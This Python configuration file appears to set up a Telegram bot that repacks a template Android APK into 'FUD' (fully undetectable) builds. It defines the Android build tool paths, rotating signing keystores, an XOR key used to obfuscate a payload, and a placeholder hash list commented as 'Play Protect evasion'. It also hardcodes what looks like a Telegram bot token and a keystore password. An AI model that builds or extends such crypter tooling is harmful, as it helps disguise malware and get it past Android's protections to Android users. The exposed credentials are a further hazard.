import os

BOT_TOKEN = "8902950524:AAFxUFbICKx4sm5JM-WGudYOSfjR3w59_Dk"

_HOME = os.path.expanduser("~")
_HERE = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(_HOME, "tools")

JAVA_BIN      = os.path.join(TOOLS_DIR, "jre", "bin", "java")
ECJ_JAR       = os.path.join(TOOLS_DIR, "ecj.jar")
APKTOOL_JAR   = os.path.join(TOOLS_DIR, "apktool.jar")
BT_DIR        = os.path.join(TOOLS_DIR, "build-tools")
APKSIGNER_BIN = os.path.join(BT_DIR, "apksigner")
ZIPALIGN_BIN  = os.path.join(BT_DIR, "zipalign")
D8_BIN        = os.path.join(BT_DIR, "d8")
ANDROID_JAR   = os.path.join(TOOLS_DIR, "platforms", "android-34", "android.jar")

# Naya path — rotating keystore per build
KEYSTORE_DIR  = os.path.join(TOOLS_DIR, "keystores")
KEYSTORE_PASS = "fudbot123"
KEY_ALIAS     = "androidkey"

# Template APK — GitHub repo root me main.py ke saath
TEMPLATE_APK = os.path.join(_HERE, "template.apk")

WORK_DIR = os.path.join(_HOME, "fud_workspace")

# XOR key (32 bytes) — strong rolling XOR + byte-swap
PAYLOAD_XOR_KEY = bytes([
    0xF1, 0x79, 0x78, 0x72, 0xAC, 0x69, 0x3E, 0xAA,
    0xB1, 0xA6, 0x4F, 0xB7, 0xF2, 0xC6, 0x30, 0x02,
    0x8D, 0x4C, 0x1A, 0xE3, 0x7F, 0x92, 0xD5, 0x6B,
    0x2C, 0x48, 0x9E, 0x11, 0x73, 0xFA, 0x05, 0xB8,
])

# Play Protect evasion: blocklist of known Play Protect signature hashes
# (agar tumhare paas hai to yahan daal do; empty rakho to skip)
KNOWN_FLAGGED_CERT_HASHES = set()

URL_JRE        = "https://github.com/adoptium/temurin17-binaries/releases/download/jdk-17.0.11%2B9/OpenJDK17U-jre_x64_linux_hotspot_17.0.11_9.tar.gz"
URL_ECJ        = "https://repo1.maven.org/maven2/org/eclipse/jdt/ecj/3.33.0/ecj-3.33.0.jar"
URL_APKTOOL    = "https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar"
URL_BUILDTOOLS = "https://dl.google.com/android/repository/build-tools_r34-linux.zip"
